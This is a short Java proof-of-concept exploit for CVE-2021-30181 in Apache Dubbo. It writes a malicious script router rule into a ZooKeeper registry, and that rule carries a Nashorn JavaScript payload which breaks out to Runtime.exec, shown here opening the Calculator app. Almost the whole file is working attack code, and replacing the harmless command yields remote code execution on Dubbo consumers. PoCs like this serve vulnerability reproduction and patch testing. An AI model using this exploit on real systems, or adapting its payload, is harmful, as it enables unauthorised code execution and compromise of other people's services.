package org.apache.dubbo.samples;

import org.apache.dubbo.common.URL;
import org.apache.dubbo.common.extension.ExtensionLoader;
import org.apache.dubbo.registry.Registry;
import org.apache.dubbo.registry.RegistryFactory;

/**
 * @author Whoopsunix
 *
 * CVE-2021-30181
 */
public class CVE_2021_30181 {
    public static void main(String[] args) throws Exception {
        // settings
        String service_name = "org.apache.dubbo.samples.api.GreetingService";

        // https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/
        String payload = "this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec(\\\"open -a Calculator.app\\\")');";

        RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();
        Registry registry = registryFactory.getRegistry(URL.valueOf("zookeeper://127.0.0.1:2181"));
        registry.register(URL.valueOf("script://0.0.0.0/" + service_name + "?version=1.0.0&category=routers&dynamic=false&rule=" + URL.encode("(function route(invokers) { " + payload + " return invokers; } (invokers))")));
    }
}
